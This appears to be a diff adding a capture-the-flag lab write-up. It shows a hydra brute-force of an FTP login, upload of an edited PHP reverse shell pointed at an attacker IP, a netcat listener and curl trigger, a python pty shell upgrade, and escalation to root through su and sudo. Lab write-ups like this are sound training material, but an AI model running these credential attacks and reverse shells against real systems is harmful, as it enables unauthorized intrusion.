@@ -90,12 +90,77 @@ root@wir3:~/Reptile#
 
 
 
+Second Challenge:
+
+I used hydra to find jenny's password:
+hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.60.59
+[DATA] attacking ftp://10.10.60.59:21/
+[21][ftp] host: 10.10.60.59   login: jenny   password: 987654321
+
+i connected to the ftp server:
+ftp jenny@10.10.60.59
+Name (10.10.60.59:root): jenny
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+Then I used:
+ftp> get shell.php
+
+And i changed some vaules on the shell:
+$ip = '10.10.188.88';  // CHANGE THIS
+$port = 8000;       // CHANGE THIS
+
+And I downloaded back to the web server:
+ftp> put shell.php
+
+Then I created a listener on the designated port on my attacker machine:
+nc -lvnp 8000
+
+And executed it:
+curl http://10.10.60.59/shell.php
 
 
+Listening on 0.0.0.0 8000
+Connection received on 10.10.60.59 42058
+Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 09:45:57 up 29 min,  0 users,  load average: 0.00, 0.00, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+Then I executed the script:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+  python3 -c — Runs Python code from the command line.
+  import pty — Imports the pty module, which lets you work with pseudo-terminals.
+  pty.spawn("/bin/bash") — Launches a fully interactive bash shell inside your current one, as if it were run from a real terminal.
 
 
+Then I logged in as jenny:
+su jenny
+su jenny
+Password: 987654321
 
+Then:
+sudo su
 
+oot@wir3:~# ls
+ls
+Reptile
+root@wir3:~# cd Re	
+cd Reptile/
+root@wir3:~/Reptile# ls
+ls
+configs   Kconfig  Makefile  README.md  userland
+flag.txt  kernel   output    scripts
+root@wir3:~/Reptile# cat flag	
+cat flag.txt 
 
 
 
